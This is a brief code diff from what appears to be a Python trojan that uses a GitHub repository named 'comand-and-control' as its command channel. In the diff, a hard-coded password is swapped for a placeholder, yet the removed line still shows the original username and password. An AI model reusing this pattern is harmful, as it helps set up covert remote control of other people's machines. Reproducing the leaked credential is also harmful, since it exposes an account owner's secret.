@@ -52,7 +52,7 @@ class GitImporter(object):
 
 
 def connect_to_github():
-    gh = login(username="l0uizz",password="dmgoverdmg1994")
+    gh = login(username="l0uizz",password="pwd")
     repo = gh.repository("l0uizz","comand-and-control")
     branch = repo.branch("master")    
 
